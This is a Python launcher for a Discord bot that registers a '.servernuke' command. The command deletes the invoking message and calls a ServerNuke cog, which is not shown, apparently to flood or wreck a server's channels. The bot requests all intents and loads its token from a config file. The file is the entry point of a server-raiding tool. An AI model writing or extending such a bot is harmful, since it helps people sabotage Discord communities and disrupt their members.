from datetime import time

import discord
from discord.ext import commands
import json
import time

from cogs.servernuke import ServerNuke

config = json.load(open("config.json"))

bot = commands.Bot(
    command_prefix='.',
    intents=discord.Intents.all()
)

@bot.command()
async def servernuke(ctx):
    id = bot.get_guild(ctx.guild.id)
    await ctx.message.delete()
    await ServerNuke.create_channel(id)

@bot.event
async def on_ready():
    print("Bot is ready...")


initial_extensions = ['servernuke']

for extension in initial_extensions:
    try:
        bot.load_extension('cogs.' + extension)
    except Exception as e:
        print(f'Failed to load extension {e}')


bot.run(config.get("token"))
